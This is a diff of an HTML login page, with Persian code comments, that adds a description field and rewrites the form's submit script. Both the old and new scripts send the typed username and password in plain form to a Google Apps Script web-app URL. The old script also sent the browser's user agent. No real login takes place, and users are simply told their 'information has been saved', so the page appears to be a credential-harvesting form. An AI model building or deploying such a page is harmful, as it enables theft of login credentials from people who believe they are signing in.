@@ -105,41 +105,56 @@
       <label for="password">Password:</label>
       <input type="password" id="password" name="password" required placeholder="Enter your password" />
 
+      <label for="description">Description:</label>
+      <input type="text" id="description" name="description" placeholder="Write something..." />
+
       <button type="submit">Login</button>
     </form>
     <div class="message" id="message"></div>
   </div>
 
-  <script>
-document.getElementById('loginForm').addEventListener('submit', function(e){
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
   e.preventDefault();
-  const username = document.getElementById('username').value.trim();
-  const password = document.getElementById('password').value.trim();
-  const messageEl = document.getElementById('message');
-  const userAgent = navigator.userAgent; // ⬅️ این خط اطلاعات مرورگر و دستگاه
 
-  if(username && password) {
-    fetch("https://script.google.com/macros/s/AKfycbxys2eP-6YuI6SojO9Bi8uw_tdQHT6RYXyXB6-00HkL6gAQ2gLWfmkSS-oozWh8MD0M0Q/exec", {
-      method: "POST",
-      headers: { "Content-Type": "application/x-www-form-urlencoded" },
-      body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&agent=${encodeURIComponent(userAgent)}`
-    })
-    .then(response => response.text())
-    .then(data => {
-      messageEl.className = 'message green';
-      messageEl.textContent = "Your information has been saved.";
-      e.target.reset();
-    })
-    .catch(err => {
-      messageEl.className = 'message red';
-      messageEl.textContent = "An error occurred. Please try again.";
-    });
-  } else {
+  // خواندن ورودی‌های فرم
+  const username    = document.getElementById('username').value.trim();
+  const password    = document.getElementById('password').value.trim();
+  const description = document.getElementById('description').value.trim();
+
+  const messageEl = document.getElementById('message');
+
+  // اعتبارسنجی ساده
+  if (!username || !password || !description) {
     messageEl.className = 'message red';
     messageEl.textContent = "Please fill out all fields.";
+    return;
   }
+
+  // ساختن بدنه‌ی درخواست بصورت x-www-form-urlencoded (بدون agent)
+  const bodyData = 
+    `username=${encodeURIComponent(username)}` +
+    `&password=${encodeURIComponent(password)}` +
+    `&description=${encodeURIComponent(description)}`;
+
+  // ارسال درخواست به Google Apps Script Web App
+  fetch("https://script.google.com/macros/s/AKfycbykEvIQGKPLSi0g819UspADfP-f5OhzdtgMDAZGOk9eepztJHZNzrjAKfLf4od2qDDrXg/exec", {
+    method: "POST",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    body: bodyData
+  })
+  .then(response => response.text())
+  .then(data => {
+    messageEl.className = 'message green';
+    messageEl.textContent = "Your information has been saved.";
+    e.target.reset();
+  })
+  .catch(err => {
+    messageEl.className = 'message red';
+    messageEl.textContent = "An error occurred. Please try again.";
+  });
 });
 
-  </script>
+</script>
 </body>
 </html>
